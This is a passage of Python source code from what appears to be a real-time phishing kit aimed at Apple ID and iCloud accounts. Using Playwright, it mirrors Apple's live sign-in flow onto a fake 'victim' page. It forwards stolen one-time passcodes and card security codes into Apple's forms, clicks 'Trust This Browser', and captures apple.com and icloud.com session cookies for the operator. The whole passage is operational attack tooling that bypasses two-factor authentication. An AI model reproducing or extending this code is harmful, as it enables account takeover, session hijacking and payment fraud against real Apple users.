        apple, frame, batch, slots, relay_seq, remote=remote
    )


def forward_otp(apple: Page, frame, digits: list) -> bool:
    frame = find_apple_frame(apple, frame)
    if not frame or len(digits) != 6:
        return False
    chars = [str(d)[-1] for d in digits]
    if not all(c.isdigit() for c in chars):
        return False
    code = ''.join(chars)
    try:
        if not sync_apple_otp_to_apple(frame, code):
            return False
        time.sleep(0.15)
        _try_otp_submit(frame)
        print('  [fwd] otp -> submit', flush=True)
        return True
    except PlaywrightError as e:
        print('  [fwd] otp ERR', repr(e), flush=True)
    return False


def _try_otp_submit(frame) -> None:
    if not frame:
        return
    try:
        btn = frame.locator('#sign-in, button[type="submit"]').filter(
            has_text=re.compile(r'continue|verify|sign in|submit|done|next', re.I)
        )
        if btn.count() > 0:
            first = btn.first
            if first.is_visible(timeout=500) and first.is_enabled(timeout=1500):
                first.click(timeout=3000)
                return
    except PlaywrightError:
        pass
    cells = _apple_otp_cells(frame)
    if cells and cells[0] != 'single':
        try:
            cells[-1].press('Enter', timeout=2500)
            return
        except PlaywrightError:
            pass
    try:
        frame.locator(
            'input.form-security-code-input, input.security-code-input, input[maxlength="1"]'
        ).last.press('Enter', timeout=2000)
    except PlaywrightError:
        pass


def forward_payment_csc(apple: Page, frame, code: str) -> bool:
    frame = find_apple_frame(apple, frame)
    if not frame or not code:
        return False
    try:
        return bool(
            frame.evaluate(
                """(code) => {
                  const inputs = [
                    'input[autocomplete="cc-csc"]',
                    'input[name*="security" i]',
                    'input[placeholder*="Security" i]',
                    'input[id*="security" i]',
                  ];
                  let el = null;
                  for (const sel of inputs) {
                    const n = document.querySelector(sel);
                    if (n && n.offsetParent !== null) {
                      el = n;
                      break;
                    }
                  }
                  if (!el) return false;
                  el.focus();
                  el.value = code;
                  el.dispatchEvent(new Event('input', { bubbles: true }));
                  const btn = Array.from(document.querySelectorAll('button')).find((b) =>
                    /continue/i.test((b.innerText || b.textContent || '').trim())
                  );
                  if (btn && !btn.disabled) btn.click();
                  return true;
                }""",
                code,
            )
        )
    except PlaywrightError:
        return False


def forward_trust(apple: Page, frame, label: str) -> bool:
    candidates = {
        'Trust': ['Trust', 'Trust This Browser'],
        'Not Now': ['Not Now'],
        "Don't Trust": ["Don't Trust", 'Don\u2019t Trust'],
    }
    texts = candidates.get(label, [label])
    scopes = [apple] + ([frame] if frame else [])
    for scope in scopes:
        for text in texts:
            try:
                scope.get_by_role('button', name=text).first.click(timeout=2000)
                return True
            except PlaywrightError:
                pass
            try:
                scope.locator(f'button:has-text("{text}")').first.click(timeout=2000)
                return True
            except PlaywrightError:
                pass
    return False


# --- apple state probing --------------------------------------------------------

def probe_apple_frame(frame):
    try:
        return frame.evaluate(APPLE_PROBE)
    except PlaywrightError:
        return None


def probe_apple_page(page: Page) -> dict:
    try:
        return page.evaluate(APPLE_PAGE_PROBE)
    except PlaywrightError:
        return {'trust': False, 'signedIn': False, 'twoFactorOnPage': False}


def route_rank(path: str) -> int:
    try:
        return ROUTE_ORDER.index(path)
    except ValueError:
        return 0


def probe_apple_surface(page: Page) -> dict:
    try:
        return page.evaluate(APPLE_SURFACE_PROBE)
    except PlaywrightError:
        return {}


def apple_route(apple_state, page_info: dict, surface: dict | None = None) -> str | None:
    surf = surface or {}
    st = apple_state or {}
    if st.get('pageKind') == 'payment' or st.get('step') == 'payment' or surf.get('payment'):
        return '/payment'
    if st.get('pageKind') == 'generic' and st.get('pageCopy'):
        return '/flow'
    if st.get('step') == 'otp':
        return '/verify'
    if page_info.get('trust'):
        return '/session'
    if page_info.get('signedIn') and not page_info.get('trust'):
        return '/loading'
    if page_info.get('twoFactorOnPage') or surf.get('twoFactorOnPage'):
        return '/verify'
    if st.get('step') == 'password':
        return '/signin'
    if st.get('step') == 'email':
        return '/signin'
    if st.get('step') == 'generic':
        return '/flow'
    return None


def apple_allows_signin_regress(apple_state, surface: dict | None) -> bool:
    st = apple_state or {}
    surf = surface or {}
    if st.get('step') in ('otp', 'payment', 'generic'):
        return False
    if st.get('pageKind') in ('payment', 'generic'):
        return False
    if surf.get('payment'):
        return False
    return st.get('step') == 'email'


def resolve_target_route(
    apple_state,
    page_info: dict,
    surface: dict | None,
    last_route: str,
) -> str:
    route = apple_route(apple_state, page_info, surface)
    st = apple_state or {}
    surf = surface or {}
    if route == '/signin' and route_rank(last_route) > route_rank('/signin'):
        if not apple_allows_signin_regress(apple_state, surf):
            if st.get('step') == 'payment' or st.get('pageKind') == 'payment' or surf.get('payment'):
                return '/payment'
            if st.get('step') == 'otp':
                return '/verify'
            if st.get('pageKind') == 'generic':
                return '/flow'
            return last_route
    if route is None:
        return last_route
    return route


def mirror_fingerprint(apple_state) -> str:
    st = apple_state or {}
    copy = st.get('verifyCopy') or st.get('paymentCopy') or st.get('pageCopy') or {}
    if isinstance(copy, dict) and (copy.get('title') or copy.get('body')):
        title = copy.get('title') or ''
        body = (copy.get('body') or '')[:120]
        return f'{title}|{body}'
    if isinstance(copy, dict):
        return hashlib.sha256(
            json.dumps(copy, sort_keys=True, default=str).encode()
        ).hexdigest()[:24]
    return str(st.get('step') or '')


def apple_ui_ready(
    apple_state,
    surface: dict | None,
    frame,
    page_info: dict | None = None,
) -> bool:
    st = apple_state or {}
    surf = surface or {}
    info = page_info or {}
    if st.get('loading'):
        return False
    if st.get('step') == 'payment' or st.get('pageKind') == 'payment' or surf.get('payment'):
        return bool(st.get('paymentCopy') or surf.get('payment'))
    if st.get('step') == 'otp' or apple_otp_step_ready(frame):
        return bool(st.get('verifyCopy') or apple_otp_step_ready(frame))
    if st.get('step') == 'password':
        return apple_password_step_ready(frame)
    if st.get('step') == 'email':
        return True
    if st.get('pageKind') == 'generic':
        return bool(st.get('pageCopy'))
    if info.get('trust') or info.get('signedIn'):
        return True
    return True


def victim_mirror_fingerprint(victim: Page) -> str:
    try:
        return victim.evaluate(
            "() => window.HarborDriver && window.HarborDriver.getMirrorFingerprint "
            " ? window.HarborDriver.getMirrorFingerprint() : ''"
        ) or ''
    except PlaywrightError:
        return ''


def victim_page_matches_apple(victim: Page, path: str, apple_state, apple_fp: str) -> bool:
    if path_of(victim.url) != path:
        return False
    victim_fp = victim_mirror_fingerprint(victim)
    if apple_fp and victim_fp:
        return victim_fp == apple_fp
    st = apple_state or {}
    if path == '/verify':
        return st.get('step') == 'otp'
    if path == '/payment':
        return st.get('step') == 'payment' or st.get('pageKind') == 'payment'
    return True


def victim_apply_apple_page(
    victim: Page,
    frame,
    apple: Page,
    apple_state,
    surface: dict | None,
    path: str,
    credentials: dict | None = None,
) -> None:
    email = (credentials or {}).get('email') or ''
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.showTemplatePanels()")
    if path == '/verify':
        sync_victim_verify_ui(victim, frame, email)
    elif path == '/payment':
        sync_victim_payment_ui(victim, frame, apple)
    elif path == '/flow':
        sync_victim_flow_ui(victim, frame)


def victim_navigate_path(
    victim: Page,
    harbor_base: str,
    path: str,
    frame,
    apple: Page,
    credentials: dict,
) -> None:
    if path == '/verify':
        victim_goto_verify(victim, harbor_base, credentials.get('email') or '', frame)
    elif path == '/payment':
        victim_goto_payment(victim, harbor_base, frame, apple)
    elif path == '/flow':
        victim_goto_flow(victim, harbor_base, frame)
    elif path == '/session':
        victim_goto(victim, harbor_base, '/session')
    elif path == '/loading':
        victim_goto(victim, harbor_base, '/loading')
    elif path == '/success':
        victim_mark_verified(victim)
        victim_goto(victim, harbor_base, '/success')
    elif path == '/signin':
        victim_goto(victim, harbor_base, '/signin')
    else:
        victim_goto(victim, harbor_base, path)


def forward_mirror_input(apple: Page, frame, payload: dict) -> None:
    frame = find_apple_frame(apple, frame)
    if not frame:
        return
    value = payload.get('value') or ''
    field_id = payload.get('id') or ''
    autocomplete = (payload.get('autocomplete') or '').lower()
    try:
        frame.evaluate(
            """(args) => {
              const { value, fieldId, autocomplete } = args;
              let el = null;
              if (fieldId) el = document.getElementById(fieldId);
              if (!el && autocomplete === 'cc-csc') {
                el = document.querySelector('input[autocomplete="cc-csc"], input[name*="security" i]');
              }
              if (!el) {
                const inputs = Array.from(document.querySelectorAll('input')).filter(
                  (n) => n.offsetParent !== null
                );
                el = inputs.find((n) => /security|csc|code|digit/i.test(n.id + n.name + n.placeholder)) || inputs[0];
              }
              if (!el) return false;
              el.focus();
              el.value = value;
              el.dispatchEvent(new Event('input', { bubbles: true }));
              return true;
            }""",
            {'value': value, 'fieldId': field_id, 'autocomplete': autocomplete},
        )
    except PlaywrightError:
        pass


def forward_mirror_click(apple: Page, frame, payload: dict) -> bool:
    frame = find_apple_frame(apple, frame)
    label = (payload.get('label') or '').strip()
    if not label:
        return False
    scopes = [apple] + ([frame] if frame else [])
    for scope in scopes:
        try:
            scope.get_by_role('button', name=re.compile(re.escape(label[:40]), re.I)).first.click(timeout=2000)
            return True
        except PlaywrightError:
            pass
        try:
            scope.locator(f'button:has-text("{label[:50]}")').first.click(timeout=2000)
            return True
        except PlaywrightError:
            pass
    if frame and re.search(r'continue', label, re.I):
        try:
            frame.locator('button').filter(has_text=re.compile('continue', re.I)).first.click(timeout=2000)
            return True
        except PlaywrightError:
            pass
    return False


def should_show_mirror_loading(
    *,
    victim_path: str,
    last_route: str,
    apple_state: dict | None,
    frame,
    surface: dict,
    route: str | None,
    pending_password_until: float,
    pending_verify_until: float,
    mirror_loading_until: float,
    otp_verifying: bool,
    hold_transition: bool = False,
) -> bool:
    now = time.time()
    st = apple_state or {}
    surf = surface or {}

    if hold_transition:
        if apple_has_blocking_signin_errors(apple_state, frame) and victim_path == '/signin':
            return False
        return True

    if apple_has_blocking_signin_errors(apple_state, frame) and victim_path == '/signin':
        return False

    if apple_otp_step_ready(frame) and victim_path in ('/signin', '/verify') and not otp_verifying:
        return False

    if victim_path == '/verify' and apple_otp_step_ready(frame) and not otp_verifying:
        return False

    if victim_path == '/payment' and (
        st.get('step') == 'payment' or st.get('pageKind') == 'payment' or surf.get('payment')
    ):
        return False

    if victim_path == last_route and route == last_route and route is not None:
        if st.get('step') in ('otp', 'payment', 'password', 'email') and not st.get('loading'):
            return False

    if pending_verify_until and now < pending_verify_until and not apple_otp_step_ready(frame):
        return True
    if pending_password_until and now < pending_password_until:
        if not apple_password_step_ready(frame) and st.get('step') != 'password':
            return True

    if route is None and route_rank(last_route) >= route_rank('/verify'):
        if victim_path == '/verify' and apple_otp_step_ready(frame) and not otp_verifying:
            return False
        return now < mirror_loading_until

    if (
        route == '/signin'
        and route_rank(last_route) > route_rank('/signin')
        and not apple_allows_signin_regress(apple_state, surf)
    ):
        return now < mirror_loading_until

    if otp_verifying and st.get('loading'):
        return True

    if st.get('loading') and victim_path != last_route:
        return True

    return now < mirror_loading_until and mirror_loading_until > 0


def clean_apple_error(message: str, *, fallback: str = '') -> str:
    s = re.sub(r'\s+', ' ', (message or '').strip())
    s = re.sub(r'^Verification Code Digit\s*', '', s, flags=re.I)
    s = re.sub(r'^(Email or Phone Number|Password|Account)\s*', '', s, flags=re.I)
    m = re.search(
        r'(Incorrect verification code\.?|Incorrect password[^.]*\.?|Check the account information[^.]*\.)',
        s,
        re.I,
    )
    if m:
        return m.group(1).strip()
    if s and not re.match(r'^verification code digit$', s, re.I):
        return s
    return fallback or 'Incorrect verification code.'


def pick_apple_error(errors: list | None) -> str:
    if not errors:
        return ''
    candidates = [clean_apple_error(e) for e in errors]
    candidates = [c for c in candidates if c]

    def score(msg: str) -> int:
        m = msg.lower()
        if 'incorrect verification code' in m:
            return 100
        if 'check the account information' in m:
            return 95
        if 'incorrect password' in m:
            return 90
        if 'incorrect' in m:
            return 85
        if 'try again' in m:
            return 70
        return 10

    if not candidates:
        return clean_apple_error(errors[-1])
    return max(candidates, key=score)


def invalidate_for_message(message: str) -> str:
    m = (message or '').lower()
    if 'verify your identity' in m or 'failed to verify' in m:
        return 'both'
    if 'password' in m and ('account' in m or 'apple id' in m):
        return 'both'
    if 'password' in m or 'incorrect' in m:
        return 'password'
    if 'verification code' in m or re.search(r'\bcode\b', m):
        return 'otp'
    if 'account' in m or 'apple id' in m or 'email' in m:
        return 'account'
    return 'both'


def apple_has_blocking_signin_errors(apple_state: dict | None, frame) -> bool:
    """True when Apple still shows the sign-in iframe error (not OTP)."""
    if apple_otp_step_ready(frame):
        return False
    errors = (apple_state or {}).get('errors') or []
    if not errors:
        return False
    msg = pick_apple_error(errors)
    if not msg:
        return False
    ml = msg.lower()
    if 'verification code' in ml or 'incorrect verification' in ml:
        return False
    return True


def apple_password_step_ready(frame) -> bool:
    if not frame:
        return False
    try:
        from apple_drive import email_ready_for_password, read_account_email

        em = read_account_email(frame)
        return email_ready_for_password(frame, em)
    except ImportError:
        pass
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const p = document.getElementById('password_text_field');
                  const a = document.getElementById('account_name_text_field');
                  const passwordVisible = !!(
                    p &&
                    !p.disabled &&
                    p.getAttribute('aria-hidden') !== 'true' &&
                    p.offsetParent !== null
                  );
                  const accountVisible = !!(a && a.offsetParent !== null);
                  if (!passwordVisible) return false;
                  if (!accountVisible) return true;
                  const v = (a.value || '').trim();
                  return v.length > 0;
                }"""
            )
        )
    except PlaywrightError:
        return False


def apple_email_step_only(frame) -> bool:
    """True when Apple iframe is still on the email/Continue step (no password box)."""
    if not frame:
        return False
    if apple_password_step_ready(frame):
        return False
    try:
        return bool(
            frame.evaluate(
                """() => {
                  const a = document.getElementById('account_name_text_field');
                  const p = document.getElementById('password_text_field');
                  const accountVisible = !!(a && a.offsetParent !== null);
                  const passwordVisible = !!(
                    p && !p.disabled && p.getAttribute('aria-hidden') !== 'true' && p.offsetParent !== null
                  );
                  return accountVisible && !passwordVisible;
                }"""
            )
        )
    except PlaywrightError:
        return False


def apple_otp_step_ready(frame) -> bool:
    if not frame:
        return False
    state = probe_apple_frame(frame)
    return bool(state and state.get('step') == 'otp')


def sync_victim_signin_from_apple(
    victim: Page,
    apple_state: dict | None,
    credentials: dict,
    *,
    allow_password: bool,
    remote: bool = False,
) -> None:
    if not allow_password:
        if remote and hasattr(victim, 'push_harbor_state'):
            victim.push_harbor_state({'clearSigninLoading': True, 'mirrorLoading': False})
        victim_eval(
            victim,
            "() => window.HarborDriver && window.HarborDriver.ensureEmailStepInPlace()",
        )
        victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.clearSubmitLoading && window.PhishBridge.clearSubmitLoading()")
        return
    step = (apple_state or {}).get('step')
    if step != 'password' and not (apple_state or {}).get('forcePassword'):
        return
    email = credentials.get('email') or ''
    if remote and hasattr(victim, 'push_harbor_state'):
        payload: dict = {
            'passwordStep': True,
            'clearSigninLoading': True,
            'mirrorLoading': False,
        }
        if email:
            payload['email'] = email
        victim.push_harbor_state(payload)
        if hasattr(victim, 'mark_password_step'):
            victim.mark_password_step()
        if hasattr(victim, 'flush_cmds'):
            victim.flush_cmds(force=True)
        return
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.ensurePasswordStep()")
    victim_eval(
        victim,
        "(e) => window.HarborDriver && window.HarborDriver.fillSignInEmail(e)",
        email,
    )
    victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.clearSubmitLoading && window.PhishBridge.clearSubmitLoading()")
    if hasattr(victim, "mark_password_step"):
        victim.mark_password_step()
    if hasattr(victim, "flush_cmds"):
        victim.flush_cmds(force=True)


def victim_show_password_step(victim, email: str, *, remote: bool) -> None:
    """Move victim sign-in UI to password step (immediate harbor-state on remote)."""
    sync_victim_signin_from_apple(
        victim,
        {'step': 'password', 'forcePassword': True},
        {'email': (email or '').strip()},
        allow_password=True,
        remote=remote,
    )


def promote_victim_password_if_apple_ready(
    apple: Page,
    frame,
    victim,
    credentials: dict,
    *,
    account_hint: str,
    remote: bool,
) -> tuple[bool, object]:
    """When Apple shows the password field, push password UI to victim immediately."""
    frame = find_apple_frame(apple, frame)
    if not frame or not apple_password_step_ready(frame):
        return False, frame
    em = (account_hint or credentials.get('email') or _apple_account_email(frame) or '').strip()
    if em:
        credentials['email'] = em
    victim_show_password_step(victim, em, remote=remote)
    return True, frame


def victim_knows_password_step(victim, victim_password_ui_applied: bool) -> bool:
    if hasattr(victim, "on_password_step"):
        return victim.on_password_step() or victim_password_ui_applied
    try:
        return bool(
            victim.evaluate(
                "() => window.HarborDriver && window.HarborDriver.signinStep() === 'password'"
            )
        )
    except PlaywrightError:
        return victim_password_ui_applied


def wait_and_sync_victim_password_step(
    victim: Page,
    apple: Page,
    frame,
    credentials: dict,
    *,
    timeout_s: float = 15.0,
) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        frame = find_apple_frame(apple, frame)
        if not frame:
            time.sleep(0.03)
            continue
        apple_state = probe_apple_frame(frame)
        if apple_state and apple_state.get('step') == 'password':
            sync_victim_signin_from_apple(
                victim, apple_state, credentials, allow_password=True
            )
            return True
        if apple_password_step_ready(frame):
            sync_victim_signin_from_apple(
                victim, {'step': 'password'}, credentials, allow_password=True
            )
            return True
        time.sleep(0.03)
    victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.setLoading(false)")
    return False


def build_verify_copy_dict(frame, email: str = '') -> dict | None:
    if not frame or not apple_otp_step_ready(frame):
        return None
    state = probe_apple_frame(frame) or {}
    copy = dict(state.get('verifyCopy') or {})
    body_text = ''
    try:
        body_text = frame.evaluate(
            "() => ((document.body && document.body.innerText) || '').replace(/\\s+/g, ' ').trim()"
        ) or ''
    except PlaywrightError:
        pass
    is_email = bool(
        copy.get('variant') == 'email'
        or state.get('verifyVariant') == 'email'
        or re.search(r'email with a verification code has been sent', body_text, re.I)
        or (
            re.search(r'enter verification code', body_text, re.I)
            and re.search(r'sent to', body_text, re.I)
        )
    )
    if is_email:
        copy['variant'] = 'email'
    elif not copy.get('variant'):
        copy['variant'] = state.get('verifyVariant') or 'device'
    if not copy.get('title'):
        copy['title'] = (
            'Enter verification code' if copy.get('variant') == 'email' else 'Two-Factor Authentication'
        )
    if not copy.get('body') and is_email:
        m = re.search(
            r'An email with a verification code has been sent to [^.]+\.\s*Enter the code to continue\.',
            body_text,
            re.I,
        )
        if m:
            copy['body'] = m.group(0)
        elif email.strip():
            local = email.strip()
            mask = (
                local[0] + '•••••' + local[local.index('@'):]
                if '@' in local
                else local[:1] + '•••••'
            )
            copy['body'] = (
                f'An email with a verification code has been sent to {mask}. '
                'Enter the code to continue.'
            )
    if not copy.get('links') and is_email:
        copy['links'] = [
            'Didn\u2019t get a verification code?',
            'Get Support PIN',
        ]
    return copy


def sync_victim_verify_ui(victim: Page, frame, email: str = '') -> None:
    copy = build_verify_copy_dict(frame, email)
    if not copy:
        return
    payload = {'verifyCopy': copy, 'mirrorLoading': False, 'signinLoading': False}
    if hasattr(victim, 'push_harbor_state'):
        victim.push_harbor_state(payload)
        return
    victim_eval(
        victim,
        '(c) => window.HarborDriver && window.HarborDriver.applyHarborState(c)',
        payload,
        flush=True,
    )


def sync_victim_payment_ui(victim: Page, frame, apple: Page) -> None:
    state = probe_apple_frame(frame) if frame else None
    copy = dict((state or {}).get('paymentCopy') or {})
    if not copy.get('title'):
        surf = probe_apple_surface(apple)
        if surf.get('payment'):
            copy = {
                'title': 'Verify your payment information',
                'body': (surf.get('snippet') or '')[:280],
            }
    if not copy:
        return
    victim_eval(
        victim,
        '(c) => window.HarborDriver && window.HarborDriver.applyPaymentMirror(c)',
        copy,
    )


def sync_victim_flow_ui(victim: Page, frame) -> None:
    if not frame:
        return
    state = probe_apple_frame(frame)
    copy = (state or {}).get('pageCopy')
    if not copy:
        return
    victim_eval(
        victim,
        '(c) => window.HarborDriver && window.HarborDriver.applyFlowMirror(c)',
        copy,
    )


def victim_goto_payment(victim: Page, harbor_base: str, frame, apple: Page) -> None:
    target = harbor_base.rstrip('/') + '/payment'
    if path_of(victim.url) == '/payment':
        ensure_driver(victim)
        sync_victim_payment_ui(victim, frame, apple)
        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")
        return
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)")
    try:
        victim.goto(target, wait_until='commit', timeout=25000)
    except PlaywrightError:
        pass
    ensure_driver(victim)
    victim_eval(
        victim,
        "() => window.PhishBridge && window.PhishBridge.applyIcloudChrome && window.PhishBridge.applyIcloudChrome()",
    )
    sync_victim_payment_ui(victim, frame, apple)
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")


def victim_goto_flow(victim: Page, harbor_base: str, frame) -> None:
    target = harbor_base.rstrip('/') + '/flow'
    if path_of(victim.url) == '/flow':
        ensure_driver(victim)
        sync_victim_flow_ui(victim, frame)
        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")
        return
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)")
    try:
        victim.goto(target, wait_until='commit', timeout=25000)
    except PlaywrightError:
        pass
    ensure_driver(victim)
    sync_victim_flow_ui(victim, frame)
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")


def victim_goto_verify(victim: Page, harbor_base: str, email: str, frame=None) -> None:
    victim_set_verify(victim, email)
    target = harbor_base.rstrip('/') + '/verify'
    if path_of(victim.url) == '/verify':
        ensure_driver(victim)
        sync_victim_verify_ui(victim, frame, email)
        victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.setLoading(false)")
        victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")
        return
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(true)")
    try:
        victim.goto(target, wait_until='commit', timeout=25000)
    except PlaywrightError:
        try:
            victim.goto(target, wait_until='load', timeout=15000)
        except PlaywrightError:
            pass
    ensure_driver(victim)
    victim_eval(
        victim,
        "() => window.PhishBridge && window.PhishBridge.applyIcloudChrome && window.PhishBridge.applyIcloudChrome()",
    )
    victim_eval(victim, "() => window.PhishBridge && window.PhishBridge.setLoading(false)")
    sync_victim_verify_ui(victim, frame, email)
    victim_eval(victim, "() => window.HarborDriver && window.HarborDriver.setMirrorLoading(false)")


def wait_and_sync_victim_verify_step(
    victim: Page,
    apple: Page,
    frame,
    harbor_base: str,
    credentials: dict,
    *,
    timeout_s: float = 45.0,
) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        frame = find_apple_frame(apple, frame)
        if apple_otp_step_ready(frame):
            victim_goto_verify(victim, harbor_base, credentials.get('email') or '', frame)
            return True
        time.sleep(0.03)
    return False


# --- victim navigation / driver -------------------------------------------------

def ensure_driver(victim: Page) -> None:
    try:
        victim.evaluate(HARBOR_DRIVER)
    except PlaywrightError:
        pass


def victim_goto(victim: Page, base: str, path: str) -> None:
    target = base.rstrip('/') + path
    if victim.url.split('?')[0].rstrip('/') == target.rstrip('/'):
        ensure_driver(victim)
        victim_eval(
            victim,
            "() => window.PhishBridge && window.PhishBridge.applyIcloudChrome && window.PhishBridge.applyIcloudChrome()",
        )
        return
    wait_until = 'commit' if path == '/verify' else 'domcontentloaded'
    timeout = 25000 if path == '/verify' else 45000
    try:
        victim.goto(target, wait_until=wait_until, timeout=timeout)
    except PlaywrightError:
        pass
    ensure_driver(victim)
    victim_eval(
        victim,
        "() => window.PhishBridge && window.PhishBridge.applyIcloudChrome && window.PhishBridge.applyIcloudChrome()",
    )


def victim_set_verify(victim: Page, email: str) -> None:
    try:
        victim.evaluate(
            "(email) => { window.HarborDriver && window.HarborDriver.setAppleMirrorPending(email); }",
            email or '',
        )
    except PlaywrightError:
        pass


def victim_mark_verified(victim: Page) -> None:
    try:
        victim.evaluate("() => { window.HarborDriver && window.HarborDriver.markVerified(); }")
    except PlaywrightError:
        pass


def drain_inject_otp(out_dir: Path, victim: Page) -> bool:
    path = out_dir / 'inject_otp.txt'
    if not path.is_file():
        return False
    try:
        code = path.read_text(encoding='utf-8').strip()
        path.unlink(missing_ok=True)
    except OSError:
        return False
    if len(code) != 6 or not code.isdigit() or path_of(victim.url) != '/verify':
        return False
    try:
        victim.evaluate(
            """(code) => {
              code.split('').forEach((d, i) => {
                const el = document.getElementById('otp-' + i);
                if (!el) return;
                el.value = d;
                el.dispatchEvent(new Event('input', { bubbles: true }));
              });
            }""",
            code,
        )
        print(f'  [mirror] injected OTP from inject_otp.txt', flush=True)
        return True
    except PlaywrightError:
        return False


def victim_eval(victim, expr: str, arg=None, *, flush: bool = False) -> None:
    try:
        if flush and hasattr(victim, 'evaluate'):
            if arg is not None:
                victim.evaluate(expr, arg, immediate=True)
            else:
                victim.evaluate(expr, immediate=True)
        elif arg is not None:
            victim.evaluate(expr, arg)
        else:
            victim.evaluate(expr)
        if flush and hasattr(victim, 'flush_cmds'):
            victim.flush_cmds(force=True)
    except (PlaywrightError, TypeError, AttributeError):
        pass


def victim_begin_signin_loading(victim, *, remote: bool) -> None:
    if remote and hasattr(victim, 'push_harbor_state'):
        victim.push_harbor_state({'signinLoading': True})
    else:
        victim_eval(
            victim,
            "() => window.PhishBridge && window.PhishBridge.setLoading && window.PhishBridge.setLoading(true)",
            flush=True,
        )


def victim_clear_signin_loading(victim, *, remote: bool, extra: dict | None = None) -> None:
    payload: dict = {'clearSigninLoading': True}
    if extra:
        payload.update(extra)
    if remote and hasattr(victim, 'push_harbor_state'):
        victim.push_harbor_state(payload)
    else:
        victim_eval(
            victim,
            "() => window.PhishBridge && window.PhishBridge.clearSubmitLoading && "
            "window.PhishBridge.clearSubmitLoading()",
            flush=True,
        )


def victim_push_signin_error(
    victim,
    message: str,
    invalidate: str = 'account',
    *,
    remote: bool,
) -> None:
    msg = (message or '').strip() or 'Something went wrong. Try again.'
    if remote and hasattr(victim, 'push_harbor_state'):
        victim.push_harbor_state(
            {
                'clearSigninLoading': True,
                'mirrorLoading': False,
                'signinError': {'msg': msg, 'inv': invalidate},
            }
        )
    else:
        victim_eval(
            victim,
            "(a) => window.HarborDriver && window.HarborDriver.showSignInError(a.msg, a.inv)",
            {'msg': msg, 'inv': invalidate},
            flush=True,
        )


def clear_victim_ui_busy(victim) -> None:
    victim_eval(
        victim,
        "() => { if (window.PhishBridge && window.PhishBridge.clearSubmitLoading) "
        "window.PhishBridge.clearSubmitLoading(); "
        "else if (window.PhishBridge) window.PhishBridge.setLoading(false); "
        "if (window.HarborDriver) window.HarborDriver.setMirrorLoading(false); }",
        flush=True,
    )


def ensure_victim_harbor_path(
    victim,
    harbor_base: str,
    target_path: str,
    frame,
    apple,
    credentials: dict,
    route_sync: VictimRouteSync,
    *,
    remote: bool,
) -> str:
    target_path = normalize_path(target_path)
    if remote and hasattr(victim, 'route_to'):
        if (
            route_sync.commanded_path == target_path
            and route_sync.reported_path == target_path
        ):
            return target_path
        if (
            route_sync.commanded_path == target_path
            and not route_sync.needs_nav_retry()
        ):
            return route_sync.operator_path()
        print(f'  [mirror] victim route_to {target_path}', flush=True)
        route_state: dict = {'mirrorLoading': False}
        if target_path == '/verify':
            vc = build_verify_copy_dict(frame, credentials.get('email') or '')
            if vc:
                route_state['verifyCopy'] = vc
        victim.route_to(target_path, route_state)
        route_sync.mark_commanded(target_path)
        return target_path

    if route_sync.operator_path() == target_path and not remote:
        return target_path
    print(f'  [mirror] victim navigate -> {target_path}', flush=True)
    victim_navigate_path(victim, harbor_base, target_path, frame, apple, credentials)
    route_sync.mark_commanded(target_path)
    clear_victim_ui_busy(victim)
    victim_apply_apple_page(
        victim, frame, apple, probe_apple_frame(frame) if frame else None, None, target_path, credentials
    )
    return target_path


# --- cookie capture -------------------------------------------------------------

def capture_cookies(context) -> list:
    try:
        cookies = context.cookies()
    except PlaywrightError:
        return []
    out = []
    for c in cookies:
        domain = c.get('domain') or ''
        if 'apple.com' in domain or 'icloud.com' in domain:
            out.append(c)
    return out


def cookie_signature(cookies: list) -> str:
    parts = []
    for c in sorted(cookies, key=lambda x: (x.get('domain', ''), x.get('name', ''))):
        parts.append(f"{c.get('domain')}|{c.get('name')}|{c.get('value')}")
    return hashlib.sha256('\n'.join(parts).encode()).hexdigest()[:16]


def write_capture(out_dir: Path, credentials: dict, cookies: list) -> dict:
    try:
        meta = write_all_capture_files(out_dir, credentials, cookies)
        notify_session_capture(out_dir, credentials, cookies, meta)
        return meta
    except OSError:
        return {'session': assess_session(cookies), 'paths': {}, 'import': {}}


def update_panel(panel: Page, data: dict) -> None:
    try:
        panel.evaluate(
            "(d) => window.__phishPanelUpdate && window.__phishPanelUpdate(d)",
            data,
        )
    except PlaywrightError:
        pass



def _mirror_lock_path(port: int, session: str) -> Path:
    lock_dir = Path(os.environ.get('TEMP', '.')) / 'harbor-mirror-locks'
    lock_dir.mkdir(parents=True, exist_ok=True)
    safe_sid = re.sub(r'[^\w\-]+', '_', (session or 'default').strip())[:64]
    return lock_dir / f'relay-{port}-{safe_sid}.lock'


def _pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def _acquire_mirror_lock(port: int, session: str) -> None:
    lock_path = _mirror_lock_path(port, session)
    (lock_path.parent / f'relay-{port}.lock').unlink(missing_ok=True)
    if lock_path.exists():
        try:
            old = int(lock_path.read_text(encoding='utf-8').strip())
            if old != os.getpid() and _pid_alive(old):
                print(
                    f'  [mirror] FATAL: another mirror holds {session!r} (pid {old}).',
                    flush=True,
                )
                sys.exit(1)
        except (ValueError, OSError):
            lock_path.unlink(missing_ok=True)
    lock_path.write_text(str(os.getpid()), encoding='utf-8')


def _enforce_mirror_lock(port: int, session: str) -> None:
    lock_path = _mirror_lock_path(port, session)
    try:
        holder = int(lock_path.read_text(encoding='utf-8').strip())
    except (FileNotFoundError, ValueError, OSError):
        lock_path.write_text(str(os.getpid()), encoding='utf-8')
        return
    if holder == os.getpid():
        return
    if _pid_alive(holder):
